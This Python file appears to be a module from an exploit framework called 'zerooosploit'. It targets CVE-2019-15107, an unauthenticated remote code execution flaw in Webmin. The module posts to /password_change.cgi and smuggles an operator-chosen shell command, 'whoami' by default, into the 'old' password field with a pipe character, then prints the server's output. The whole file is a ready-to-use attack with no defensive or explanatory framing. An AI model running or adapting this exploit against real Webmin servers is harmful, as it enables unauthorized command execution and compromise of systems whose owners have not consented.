#!/usr/bin/python
# -*- coding:utf8 -*-
from zerooosploit.exploits import ExploitAggregate
from zerooosploit.color import *
import requests


class Zerooosploit(ExploitAggregate):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': 'Webmin Unauthenticated Remote Code Execution',
            'Module': 'exploits/webmin/cve-2019-15107',
            'Product': 'webmin',
            'Cve': 'CVE-2019-15107',
            'Create_date': '2019-12-21',
            'Description': '',
            'Authors': '01sec',
            'References': 'https://www.exploit-db.com/exploits/47230'
        }

        self.option = {
            'url': {'Current Setting': 'http://127.0.0.1:10000/', 'Required': 'yes', 'Description': 'The target url'},
            'command': {'Current Setting': 'whoami', 'Required': 'yes', 'Description': 'Execute system commands'}
        }

    def exploit(self):
        url = self.get_options('url')
        command = self.get_options('command')
        vul_url = url + '/password_change.cgi'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0)Gecko/20100101 Firefox/60.0', 'Cookie': 'redirect=1; testing=1; sid=x; sessiontest=1', 'Referer': '{}'.format(url + '/session_login.cgi')}
        payload = {'user': 'rootxx', 'pam': '', 'expired': '2', 'old': 'test|{}'.format(command), 'new1': 'test2', 'new2': 'test2'}
        try:
            r = requests.post(url=vul_url, headers=headers, data=payload, timeout=60, verify=False)
            print_red('[*] {0} Target status is {1}'.format(vul_url, r.status_code))
            if r.status_code == 200:
                print(r.text)
                print_green('[+] Exploit succeed,{0}'.format(vul_url))
            else:
                print_red('[-] {0} {1}'.format(vul_url, r.status_code))
        except requests.exceptions.Timeout:
            print_red('[-] {0} Error: Timeout'.format(vul_url))
        except requests.exceptions.ConnectionError:
            print_red('[-] {0} Error: ConnectionError'.format(vul_url))

        print_blue('[*] Exploit completed')
